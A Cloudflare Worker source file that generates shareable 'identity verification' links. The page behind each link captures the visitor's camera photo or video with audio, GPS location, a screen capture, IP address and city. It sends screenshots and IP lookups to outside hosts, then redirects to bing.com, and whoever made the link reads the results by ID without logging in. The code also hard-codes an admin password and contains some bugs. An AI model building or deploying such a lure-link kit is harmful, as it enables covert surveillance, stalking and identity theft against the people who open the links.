// Cloudflare Worker代码 - 真人身份验证系统

const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD = '1591156135qwzxcv';
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

// HTML模板
const getMainHTML = (domain) => `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device=device-width, initial-scale=1.0">
    <title>真人身份验证系统</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 20px; 
            background: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .tab {
            display: inline-block;
            padding: 10px 20px;
            margin-right: 5px;
            cursor: pointer;
            border: 1px solid #ddd;
            border-bottom: none;
            border-radius: 5px 5px 0 0;
            background: #f0f0f0;
        }
        .tab.active {
            background: white;
            font-weight: bold;
        }
        .tab-content {
            border: 1px solid #ddd;
            padding: 20px;
            margin-top: -1px;
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        input, textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background: #0070f3;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #0051cc;
        }
        .result-box {
            margin-top: 20px;
            padding: 15px;
            background: #e8f5e8;
            border: 1px solid #4CAF50;
            border-radius: 5px;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }
        .file-preview {
            max-width: 100px;
            max-height: 100px;
            margin: 5px;
            border: 1px solid #ddd;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            border: 1px solid #ddd;
            text-align: left;
        }
        th {
            background: #f0f0f0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 真人身份验证系统</h1>
        <p>专业级身份验证解决方案</p>
        
        <div class="tabs">
            <div class="tab active" onclick="switchTab('generate')">生成验证链接</div>
            <div class="tab" onclick="switchTab('query')">查询验证记录</div>
            <div class="tab" onclick="switchTab('admin')">管理员后台</div>
        </div>
        
        <!-- 生成面板 -->
        <div id="generateTab" class="tab-content active">
            <div class="warning">
                <strong>注意：</strong>本工具仅用于合法身份验证用途，使用者需自行承担所有法律责任。
            </div>
            
            <form id="generateForm">
                <label>验证ID（唯一标识）</label>
                <input type="text" id="userId" required placeholder="请输入唯一ID">
                
                <label>验证后跳转链接</label>
                <input type="text" id="redirectUrl" placeholder="https://www.bing.com" value="https://www.bing.com">
                
                <label>验证设置：</label><br>
                <input type="checkbox" id="requireLocation"> 获取地理位置
                <input type="checkbox" id="requireScreenshot" style="margin-left: 20px;"> 获取屏幕截图
                
                <br><br>
                <label>视频录制时长（秒）</label>
                <input type="number" id="maxVideoTime" value="10" min="1" max="60">
                
                <br><br>
                <input type="checkbox" id="agreeTerms" required>
                <label for="agreeTerms">我已阅读并同意用户协议</label>
                
                <br><br>
                <button type="submit">生成验证链接</button>
            </form>
            
            <div id="generateResult" class="result-box" style="display:none">
                <h3>验证链接生成成功！</h3>
                <p>请复制以下链接：</p>
                <div style="background: #f8f9fa; padding: 10px; border-radius: 5px;">
                    <span id="generatedLink"></span>
                </div>
            </div>
        </div>
        
        <!-- 查询面板 -->
        <div id="queryTab" class="tab-content">
            <form id="queryForm">
                <label>验证ID</label>
                <input type="text" id="queryId" required placeholder="请输入要查询的ID">
                <button type="submit">查询</button>
            </form>
            
            <div id="queryResult" style="display:none; margin-top: 20px;">
                <h3>验证记录</h3>
                <div id="uploadsList"></div>
            </div>
        </div>
        
        <!-- 管理员面板 -->
        <div id="adminTab" class="tab-content">
            <div id="adminLogin">
                <h3>管理员登录</h3>
                <form id="adminLoginForm">
                    <label>用户名</label>
                    <input type="text" id="adminUsername">
                    
                    <label>密码</label>
                    <input type="password" id="adminPassword">
                    
                    <br><br>
                    <button type="submit">登录</button>
                </form>
            </div>
            
            <div id="adminPanel" style="display:none">
                <h3>管理面板</h3>
                <div>
                    <button onclick="loadRecords()">查看所有记录</button>
                    <button onclick="adminLogout()" style="float:right;">退出登录</button>
                </div>
                
                <div id="adminContent" style="margin-top: 20px;"></div>
            </div>
        </div>
    </div>
    
    <script>
        const domain = '${domain}';
        
        // 页面切换
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            
            event.target.classList.add('active');
            document.getElementById(tabName + 'Tab').classList.add('active');
        }
        
        // 生成链接
        document.getElementById('generateForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const userId = document.getElementById('userId').value.trim();
            const redirectUrl = document.getElementById('redirectUrl').value.trim();
            const requireLocation = document.getElementById('requireLocation').checked;
            const requireScreenshot = document.getElementById('requireScreenshot').checked;
            const maxVideoTime = document.getElementById('maxVideoTime').value;
            
            const response = await fetch('/api/generate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: userId,
                    redirectUrl: redirectUrl || 'https://www.bing.com',
                    requireLocation: requireLocation,
                    requireScreenshot: requireScreenshot,
                    maxVideoTime: parseInt(maxVideoTime)
                })
            });
            
            const result = await response.json();
            if (result.success) {
                const link = 'https://' + domain + '/' + userId;
                document.getElementById('generatedLink').textContent = link;
                document.getElementById('generateResult').style.display = 'block';
                
                // 复制到剪贴板
                navigator.clipboard.writeText(link);
                alert('链接已复制到剪贴板！');
            } else {
                alert('生成失败：' + result.error);
            }
        });
        
        // 查询记录
        document.getElementById('queryForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const queryId = document.getElementById('queryId').value.trim();
            
            const response = await fetch('/api/query/' + queryId);
            const result = await response.json();
            
            if (result.success && result.uploads) {
                const uploadsList = document.getElementById('uploadsList');
                uploadsList.innerHTML = '';
                
                result.uploads.forEach(upload => {
                    const fileUrl = 'https://tc.ilqx.dpdns.org' + upload.file_url;
                    const time = new Date(upload.timestamp * 1000).toLocaleString();
                    
                    uploadsList.innerHTML += \`
                        <div style="border:1px solid #ddd; padding:10px; margin:5px 0;">
                            <strong>\${upload.upload_type === 'photo' ? '照片' : '视频'}</strong>
                            <div>时间：\${time}</div>
                            <div>IP：\${upload.visitor_ip}</div>
                            <div>位置：\${upload.visitor_city || '未知'}</div>
                            <img src="\${fileUrl}" class="file-preview" onclick="window.open('\${fileUrl}')">
                        </div>
                    \`;
                });
                
                document.getElementById('queryResult').style.display = 'block';
            } else {
                alert('查询失败：' + (result.error || '没有记录'));
            }
        });
        
        // 管理员登录
        document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('adminUsername').value;
            const password = document.getElementById('adminPassword').value;
            
            const response = await fetch('/api/admin/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            
            const result = await response.json();
            if (result.success) {
                localStorage.setItem('adminSession', result.session);
                document.getElementById('adminLogin').style.display = 'none';
                document.getElementById('adminPanel').style.display = 'block';
                loadRecords();
            } else {
                alert('登录失败：' + result.error);
            }
        });
        
        // 检查是否已登录
        if (localStorage.getItem('adminSession')) {
            document.getElementById('adminLogin').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
        }
        
        async function loadRecords() {
            const session = localStorage.getItem('adminSession');
            const response = await fetch('/api/admin/records', {
                headers: { 'X-Session': session }
            });
            
            const result = await response.json();
            if (result.success) {
                let html = '<table>';
                html += '<tr><th>ID</th><th>创建者IP</th><th>创建时间</th><th>验证次数</th><th>操作</th></tr>';
                
                result.records.forEach(record => {
                    const time = new Date(record.created_at * 1000).toLocaleString();
                    html += \`<tr>
                        <td>\${record.id}</td>
                        <td>\${record.creator_ip}</td>
                        <td>\${time}</td>
                        <td>\${record.verification_count || 0}</td>
                        <td>
                            <button onclick="viewRecordDetails('\${record.id}')">查看</button>
                        </td>
                    </tr>\`;
                });
                
                html += '</table>';
                document.getElementById('adminContent').innerHTML = html;
            }
        }
        
        function adminLogout() {
            localStorage.removeItem('adminSession');
            location.reload();
        }
        
        function viewRecordDetails(id) {
            window.location.href = '/admin/record/' + id;
        }
    </script>
</body>
</html>
`;

const getVerificationHTML = (recordId, config) => `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>身份验证</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        video {
            width: 100%;
            max-width: 500px;
            border: 2px solid #333;
            border-radius: 10px;
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        .permission-box {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>身份验证</h1>
        
        <div id="permissionRequest" class="permission-box">
            <h2>权限请求</h2>
            <p>本网站需要获取以下权限进行身份验证：</p>
            <ul style="text-align: left; margin-left: 20px;">
                <li>📷 摄像头权限（用于拍照/录像验证）</li>
                ${config.requireLocation ? '<li>📍 地理位置权限</li>' : ''}
                ${config.requireScreenshot ? '<li>🖥️ 屏幕截图权限</li>' : ''}
            </ul>
            <p style="color: red; font-weight: bold;">拒绝权限将无法进行验证！</p>
            <button onclick="requestPermissions()">同意并继续</button>
            <button onclick="denyPermissions()" style="background: #dc3545;">拒绝</button>
        </div>
        
        <div id="cameraContainer" style="display:none;">
            <video id="video" autoplay playsinline></video>
            <br>
            <button onclick="capturePhoto()">拍照验证</button>
            <button onclick="startVideoMode()">录像验证（${config.maxVideoTime}秒）</button>
        </div>
        
        <div id="videoMode" style="display:none;">
            <video id="videoRecorder" autoplay playsinline></video>
            <div id="timer" style="font-size: 24px; font-weight: bold; margin: 10px;">${config.maxVideoTime}</div>
            <button onclick="startRecording()" id="recordBtn">开始录制</button>
            <button onclick="stopRecording()" id="stopBtn" style="display:none;">停止录制</button>
        </div>
        
        <div id="photoResult" style="display:none; margin: 20px;">
            <img id="capturedImage" style="max-width: 500px; border: 2px solid #333;">
            <br>
            <button onclick="uploadPhoto()">上传验证</button>
            <button onclick="retakePhoto()">重新拍摄</button>
        </div>
        
        <div id="videoResult" style="display:none; margin: 20px;">
            <video id="recordedVideo" controls style="max-width: 500px;"></video>
            <br>
            <button onclick="uploadVideo()">上传验证</button>
            <button onclick="retakeVideo()">重新录制</button>
        </div>
        
        <div id="uploadProgress" style="display:none;">
            <h3>正在上传...</h3>
            <div style="width: 100%; height: 20px; background: #f0f0f0; border-radius: 10px;">
                <div id="progressBar" style="width: 0%; height: 100%; background: #0070f3; border-radius: 10px;"></div>
            </div>
        </div>
        
        <div id="permissionDenied" style="display:none; color: red;">
            <h2>权限被拒绝</h2>
            <p>您拒绝了必要的权限，无法进行验证。</p>
        </div>
        
        <div id="uploadComplete" style="display:none; color: green;">
            <h2>验证完成！</h2>
            <p>正在跳转...</p>
        </div>
    </div>
    
    <script>
        const recordId = '${recordId}';
        const config = ${JSON.stringify(config)};
        
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let timerInterval = null;
        let timeLeft = config.maxVideoTime;
        
        function requestPermissions() {
            document.getElementById('permissionRequest').style.display = 'none';
            document.getElementById('cameraContainer').style.display = 'block';
            initCamera();
        }
        
        function denyPermissions() {
            document.getElementById('permissionRequest').style.display = 'none';
            document.getElementById('permissionDenied').style.display = 'block';
        }
        
        async function initCamera() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: true
                });
                
                const video = document.getElementById('video') || document.getElementById('videoRecorder');
                video.srcObject = mediaStream;
                
                // 记录访问
                await fetch('/api/visit/' + recordId, { method: 'POST' });
                
            } catch (err) {
                alert('获取摄像头权限失败：' + err.message);
            }
        }
        
        function capturePhoto() {
            document.getElementById('cameraContainer').style.display = 'none';
            document.getElementById('photoResult').style.display = 'block';
            
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            document.getElementById('capturedImage').src = canvas.toDataURL('image/jpeg');
            
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        }
        
        function retakePhoto() {
            document.getElementById('photoResult').style.display = 'none';
            document.getElementById('cameraContainer').style.display = 'block';
            initCamera();
        }
        
        function startVideoMode() {
            document.getElementById('cameraContainer').style.display = 'none';
            document.getElementById('videoMode').style.display = 'block';
            
            if (mediaStream) {
                const videoRecorder = document.getElementById('videoRecorder');
                videoRecorder.srcObject = mediaStream;
            }
        }
        
        function startRecording() {
            recordedChunks = [];
            
            const stream = mediaStream;
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp9'
            });
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const videoURL = URL.createObjectURL(blob);
                document.getElementById('recordedVideo').src = videoURL;
                
                document.getElementById('videoMode').style.display = 'none';
                document.getElementById('videoResult').style.display = 'block';
            };
            
            mediaRecorder.start();
            document.getElementById('recordBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'inline-block';
            
            // 开始计时
            timeLeft = config.maxVideoTime;
            document.getElementById('timer').textContent = timeLeft;
            
            timerInterval = setInterval(() => {
                timeLeft--;
                document.getElementById('timer').textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    stopRecording();
                }
            }, 1000);
        }
        
        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                clearInterval(timerInterval);
            }
        }
        
        function retakeVideo() {
            document.getElementById('videoResult').style.display = 'none';
            document.getElementById('videoMode').style.display = 'block';
            document.getElementById('recordBtn').style.display = 'inline-block';
            document.getElementById('stopBtn').style.display = 'none';
            
            if (mediaStream) {
                const videoRecorder = document.getElementById('videoRecorder');
                videoRecorder.srcObject = mediaStream;
            }
        }
        
        async function uploadPhoto() {
            const img = document.getElementById('capturedImage');
            
            // 将base64转换为blob
            const response = await fetch(img.src);
            const blob = await response.blob();
            
            await uploadFile(blob, 'photo');
        }
        
        async function uploadVideo() {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            await uploadFile(blob, 'video');
        }
        
        async function uploadFile(blob, type) {
            if (blob.size > 5242880) { // 5MB
                alert('文件大小超过5MB限制');
                return;
            }
            
            document.getElementById('photoResult').style.display = 'none';
            document.getElementById('videoResult').style.display = 'none';
            document.getElementById('uploadProgress').style.display = 'block';
            
            const formData = new FormData();
            formData.append('file', blob, 'verification.' + (type === 'photo' ? 'jpg' : 'webm'));
            formData.append('type', type);
            formData.append('recordId', recordId);
            
            // 获取地理位置
            if (config.requireLocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 5000
                        });
                    });
                    
                    formData.append('latitude', position.coords.latitude);
                    formData.append('longitude', position.coords.longitude);
                } catch (err) {
                    console.warn('获取地理位置失败');
                }
            }
            
            // 获取屏幕截图
            if (config.requireScreenshot) {
                try {
                    const screenStream = await navigator.mediaDevices.getDisplayMedia({
                        video: true
                    });
                    
                    const videoTrack = screenStream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(videoTrack);
                    const bitmap = await imageCapture.grabFrame();
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = bitmap.width;
                    canvas.height = bitmap.height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(bitmap, 0, 0);
                    
                    canvas.toBlob(async (screenshotBlob) => {
                        const screenshotFormData = new FormData();
                        screenshotFormData.append('file', screenshotBlob, 'screenshot.jpg');
                        
                        const response = await fetch('https://tc.ilqx.dpdns.org/upload', {
                            method: 'POST',
                            body: screenshotFormData
                        });
                        
                        const result = await response.json();
                        if (result[0] && result[0].src) {
                            formData.append('screenshotUrl', result[0].src);
                        }
                    }, 'image/jpeg', 0.7);
                    
                    videoTrack.stop();
                } catch (err) {
                    console.warn('获取屏幕截图失败');
                }
            }
            
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/api/upload', true);
            
            xhr.upload.onprogress = (event) => {
                if (event.lengthComputable) {
                    const percent = (event.loaded / event.total) * 100;
                    document.getElementById('progressBar').style.width = percent + '%';
                }
            };
            
            xhr.onload = () => {
                if (xhr.status === 200) {
                    document.getElementById('uploadProgress').style.display = 'none';
                    document.getElementById('uploadComplete').style.display = 'block';
                    
                    setTimeout(() => {
                        window.location.href = config.redirectUrl;
                    }, 2000);
                } else {
                    alert('上传失败，请重试');
                }
            };
            
            xhr.send(formData);
        }
    </script>
</body>
</html>
`;

// D1数据库SQL
const DB_SCHEMA = `
CREATE TABLE IF NOT EXISTS records (
    id TEXT PRIMARY KEY,
    creator_ip TEXT,
    creator_ua TEXT,
    created_at INTEGER,
    total_views INTEGER DEFAULT 0,
    custom_redirect TEXT DEFAULT 'https://www.bing.com',
    require_location INTEGER DEFAULT 0,
    require_screenshot INTEGER DEFAULT 0,
    max_video_time INTEGER DEFAULT 10
);

CREATE TABLE IF NOT EXISTS uploads (
    upload_id INTEGER PRIMARY KEY AUTOINCREMENT,
    record_id TEXT,
    visitor_ip TEXT,
    visitor_ua TEXT,
    visitor_country TEXT,
    visitor_city TEXT,
    file_url TEXT,
    upload_type TEXT,
    timestamp INTEGER,
    latitude REAL,
    longitude REAL,
    screenshot_data TEXT,
    FOREIGN KEY(record_id) REFERENCES records(id)
);

CREATE TABLE IF NOT EXISTS admin_sessions (
    session_id TEXT PRIMARY KEY,
    admin_ip TEXT,
    expires_at INTEGER
);
`;

// 主处理函数
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // 设置CORS头
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Session'
    };
    
    // 处理预检请求
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: corsHeaders
      });
    }
    
    // API路由
    if (path.startsWith('/api/')) {
      return handleAPI(request, env, url);
    }
    
    // 管理员页面路由
    if (path.startsWith('/admin')) {
      return handleAdminPage(request, env, path);
    }
    
    // 验证页面（动态ID）
    const idMatch = path.match(/^\/([a-zA-Z0-9_\-]+)$/);
    if (idMatch && idMatch[1] !== 'api' && idMatch[1] !== 'admin') {
      return handleVerificationPage(request, env, idMatch[1]);
    }
    
    // 主页面
    return new Response(getMainHTML(url.hostname), {
      headers: {
        'Content-Type': 'text/html;charset=UTF-8',
        ...corsHeaders
      }
    });
  }
};

// API处理器
async function handleAPI(request, env, url) {
  const path = url.pathname;
  
  try {
    switch (true) {
      case path === '/api/generate':
        return await handleGenerate(request, env);
        
      case path === '/api/admin/login':
        return await handleAdminLogin(request, env);
        
      case path === '/api/admin/records':
        return await handleAdminRecords(request, env);
        
      case path.startsWith('/api/query/'):
        const queryId = path.split('/')[3];
        return await handleQuery(queryId, env);
        
      case path.startsWith('/api/visit/'):
        const visitId = path.split('/')[3];
        return await handleVisit(visitId, env, request);
        
      case path === '/api/upload':
        return await handleUpload(request, env);
        
      default:
        return jsonResponse({ error: 'API endpoint not found' }, 404);
    }
  } catch (error) {
    return jsonResponse({ error: error.message }, 500);
  }
}

// 处理生成链接
async function handleGenerate(request, env) {
  const data = await request.json();
  const { id, redirectUrl, requireLocation, requireScreenshot, maxVideoTime } = data;
  
  if (!id) {
    return jsonResponse({ error: 'ID不能为空' }, 400);
  }
  
  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
  const ua = request.headers.get('User-Agent') || 'unknown';
  
  await env.DB.prepare(`
    INSERT OR REPLACE INTO records 
    (id, creator_ip, creator_ua, created_at, custom_redirect, require_location, require_screenshot, max_video_time)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `).bind(
    id,
    ip,
    ua,
    Math.floor(Date.now() / 1000),
    redirectUrl || 'https://www.bing.com',
    requireLocation ? 1 : 0,
    requireScreenshot ? 1 : 0,
    maxVideoTime || 10
  ).run();
  
  return jsonResponse({ 
    success: true, 
    id: id,
    link: `https://${url.hostname}/${id}`
  });
}

// 处理查询
async function handleQuery(id, env) {
  const record = await env.DB.prepare(`
    SELECT * FROM records WHERE id = ?
  `).bind(id).first();
  
  if (!record) {
    return jsonResponse({ error: '记录不存在' }, 404);
  }
  
  const uploads = await env.DB.prepare(`
    SELECT * FROM uploads WHERE record_id = ? ORDER BY timestamp DESC
  `).bind(id).all();
  
  return jsonResponse({ 
    success: true,
    record: record,
    uploads: uploads.results || []
  });
}

// 处理访问
async function handleVisit(id, env, request) {
  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
  const ua = request.headers.get('User-Agent') || 'unknown';
  
  // 获取地理位置
  let geoInfo = {};
  try {
    const geoResponse = await fetch(`https://ip.ilqx.dpdns.org/geo?ip=${ip}`);
    geoInfo = await geoResponse.json();
  } catch (e) {
    // 忽略错误
  }
  
  // 更新访问计数
  await env.DB.prepare(`
    UPDATE records SET total_views = total_views + 1 WHERE id = ?
  `).bind(id).run();
  
  return jsonResponse({ 
    success: true,
    geo: geoInfo
  });
}

// 处理上传
async function handleUpload(request, env) {
  const formData = await request.formData();
  const file = formData.get('file');
  const type = formData.get('type');
  const recordId = formData.get('recordId');
  const latitude = formData.get('latitude');
  const longitude = formData.get('longitude');
  const screenshotUrl = formData.get('screenshotUrl');
  
  if (!file || !type || !recordId) {
    return jsonResponse({ error: '缺少必要参数' }, 400);
  }
  
  if (file.size > MAX_FILE_SIZE) {
    return jsonResponse({ error: '文件大小超过5MB限制' }, 400);
  }
  
  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
  const ua = request.headers.get('User-Agent') || 'unknown';
  
  // 获取地理位置信息
  let geoInfo = {};
  try {
    const geoResponse = await fetch(`https://ip.ilqx.dpdns.org/geo?ip=${ip}`);
    geoInfo = await geoResponse.json();
  } catch (e) {
    // 忽略错误
  }
  
  // 生成文件名
  const timestamp = Date.now();
  const randomStr = Math.random().toString(36).substring(2, 15);
  const fileExt = type === 'photo' ? 'jpg' : type === 'video' ? 'webm' : 'bin';
  const fileName = `${timestamp}_${randomStr}.${fileExt}`;
  
  // 注意：这里需要您自己实现上传到 tc.ilqx.dpdns.org
  // 这里我们假设上传成功，返回文件路径
  const fileUrl = `/file/${fileName}`;
  
  await env.DB.prepare(`
    INSERT INTO uploads 
    (record_id, visitor_ip, visitor_ua, visitor_country, visitor_city, 
     file_url, upload_type, timestamp, latitude, longitude, screenshot_data)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `).bind(
    recordId,
    ip,
    ua,
    geoInfo.country || '',
    geoInfo.city || '',
    fileUrl,
    type,
    Math.floor(Date.now() / 1000),
    latitude || null,
    longitude || null,
    screenshotUrl || ''
  ).run();
  
  return jsonResponse({ 
    success: true,
    file_url: fileUrl,
    message: '上传成功'
  });
}

// 管理员登录
async function handleAdminLogin(request, env) {
  const data = await request.json();
  const { username, password } = data;
  
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    // 生成会话ID
    const sessionId = generateSessionId();
    const expiresAt = Math.floor(Date.now() / 1000) + (24 * 60 * 60);
    const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
    
    await env.DB.prepare(`
      INSERT INTO admin_sessions (session_id, admin_ip, expires_at)
      VALUES (?, ?, ?)
    `).bind(sessionId, ip, expiresAt).run();
    
    return jsonResponse({ 
      success: true,
      session: sessionId
    });
  } else {
    return jsonResponse({ error: '用户名或密码错误' }, 401);
  }
}

// 管理员获取记录
async function handleAdminRecords(request, env) {
  const sessionId = request.headers.get('X-Session');
  
  // 验证会话
  const session = await env.DB.prepare(`
    SELECT * FROM admin_sessions 
    WHERE session_id = ? AND expires_at > ?
  `).bind(sessionId, Math.floor(Date.now() / 1000)).first();
  
  if (!session) {
    return jsonResponse({ error: '会话无效或已过期' }, 401);
  }
  
  // 获取所有记录
  const records = await env.DB.prepare(`
    SELECT r.*, COUNT(u.upload_id) as verification_count
    FROM records r
    LEFT JOIN uploads u ON r.id = u.record_id
    GROUP BY r.id
    ORDER BY r.created_at DESC
  `).all();
  
  // 获取所有文件
  const files = await env.DB.prepare(`
    SELECT u.*, r.creator_ip as record_creator_ip
    FROM uploads u
    LEFT JOIN records r ON u.record_id = r.id
    ORDER BY u.timestamp DESC
    LIMIT 100
  `).all();
  
  return jsonResponse({ 
    success: true,
    records: records.results || [],
    files: files.results || []
  });
}

// 管理员页面
async function handleAdminPage(request, env, path) {
  // 返回主页面，由前端JavaScript处理
  return new Response(getMainHTML(request.url.hostname), {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8'
    }
  });
}

// 验证页面
async function handleVerificationPage(request, env, id) {
  // 检查记录是否存在
  const record = await env.DB.prepare(`
    SELECT * FROM records WHERE id = ?
  `).bind(id).first();
  
  if (!record) {
    return new Response('验证链接不存在或已过期', {
      status: 404,
      headers: { 'Content-Type': 'text/html' }
    });
  }
  
  const config = {
    requireLocation: record.require_location === 1,
    requireScreenshot: record.require_screenshot === 1,
    maxVideoTime: record.max_video_time || 10,
    redirectUrl: record.custom_redirect || 'https://www.bing.com'
  };
  
  return new Response(getVerificationHTML(id, config), {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8'
    }
  });
}

// 辅助函数
function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status: status,
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*'
    }
  });
}

function generateSessionId() {
  return Array.from(crypto.getRandomValues(new Uint8Array(32)))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}